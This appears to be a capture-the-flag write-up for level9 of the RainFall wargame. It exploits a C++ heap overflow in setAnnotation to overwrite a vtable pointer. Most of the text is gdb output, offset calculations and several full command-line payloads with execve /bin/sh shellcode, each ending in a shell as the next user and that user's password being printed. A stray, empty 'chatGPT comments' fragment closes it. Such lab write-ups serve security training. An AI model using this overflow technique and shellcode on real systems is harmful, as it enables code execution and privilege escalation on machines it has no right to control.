
TLDR
```
creat first object stored at 0x1c(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   
second object stored at 0x18(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)

call setAnnotation(av1)
 
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   
   b *main+58
   b *main+92
   b *main+136
   
   define hook-stop
   
   r AAAA
   
   x/80wx 0x804a000
   
   0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
   0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
   0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
   
x/s *0x08048848
   0x804873a      ==> N::operator+(N&)

ni

=> 0x08048693 <+159>:	call   *%edx

(gdb) i r $edx
edx            0x804873a   ==> N::operator+(N&)


```

```
(gdb) set hei 40
(gdb) info func


0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt

0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)

```

```
=> 0x08048684 <+144>:	mov    0x14(%esp),%eax

(gdb) x $eax
0x8048848 <_ZTV1N+8>:	 

(gdb) x *$eax
0x804873a <_ZN1NplERS_> 0x08048848 === calls the operator overload == 0x0804873a  N::operator+(N&)

(gdb) x $edx
0x804873a <_ZN1NplERS_>
```

a call to EDX is direfferenced to a call to operator overload(+)
```
return *(arg2 + 0x68) + *(arg1 + 0x68) // 104
```
can be verified
```
level9@RainFall:~$ ./level9 AAAA
level9@RainFall:~$ echo $?
11
```
5 + 6 = 11

via gdb

```
(gdb) b *main+159 // call   *%edx
Breakpoint 1 at 0x8048693

(gdb) run AAAA

(gdb) x/60wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000

(gdb) x 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a

(gdb) i r
eax            0x804a078	134520952
ecx            0x41414141	1094795585
edx            0x804873a	134514490
```
```
offset = p/d 0x804a078 - 0x804a00c = 108

shellcode = 21
108-21-4 = 83
```

EDX is shifted by 4 in func setAnnotation()

```
assembler code for function _ZN1N13setAnnotationEPc:
   
   0x0804871f <+17>:    mov    0x8(%ebp),%edx
   0x08048722 <+20>:    add    $0x4,%edx

The instruction at 0x0804871f loads the second argument passed to the function (a pointer to a char) into EDX.
The instruction at 0x08048722 adds 4 to EDX.
```
the final payload 
```
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]')
$ pwd
/home/user/level9
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

```

```

run $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")

(gdb)  x/70wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010
0x804a010:	0xe1f7c931	0x2f2f6851	0x2f686873	0x896e6962
0x804a020:	0xcd0bb0e3	0x41414180	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a070:	0x41414141	0x41414141	0x0804a00c	0x00000000


=> 0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
(gdb) i r
eax            0x804a078	134520952
ecx            0x804a00c	134520844
edx            0x804a010	134520848
eip            0x8048693	0x8048693 <main+159>

(gdb) ni
0x0804a010 in ?? ()

```

```
(gdb) run $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + 
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')


Breakpoint 3, 0x0804867c in main ()
(gdb)  x/70wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a060:	0x6a414141	0x5299580b	0x732f2f68	0x622f6868
0x804a070:	0xe3896e69	0x80cdc931	0x0804a00c	0x00000000


=> 0x08048693 <+159>:	call   *%edx

-------------R----------
eax            0x804a078	134520952
ecx            0x804a00c	134520844
edx            0x804a010	134520848
eip            0x8048693	0x8048693 <main+159>


(gdb) ni
0x0804a010 in ?? ()
(gdb) ni
0x0804a011 in ?? ()

```

```
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')

$ pwd
/home/user/level9
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

```
./level9 $(python -c 'print "\x08\x04\xa0\x18"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')
```

the follwing are chatGPT comments:

```
check source section
```
  
  
  
